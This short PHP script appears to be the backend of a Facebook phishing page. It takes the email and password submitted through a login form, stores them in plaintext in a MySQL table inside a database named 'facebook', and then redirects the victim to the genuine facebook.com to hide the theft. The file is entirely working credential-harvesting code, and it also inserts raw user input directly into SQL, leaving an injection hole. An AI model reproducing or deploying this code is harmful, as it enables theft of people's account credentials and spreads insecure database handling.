<?php
//print_r ($_POST);

$mail = $_POST["email"];
$pass = $_POST["password"];

$dbcon = new mysqli("localhost","root","","facebook");

  if($dbcon->connect_error){
	exit("failed to connect ".$dbcon->connect_error);
}

$sql = "INSERT INTO userform (email,password) VALUES ('$mail','$pass')";

if($dbcon->query($sql) === TRUE){
	
}else{echo "failed ".$dbcon->error;
	exit();
}

$dbcon->close();

header("location: https://www.facebook.com");

?>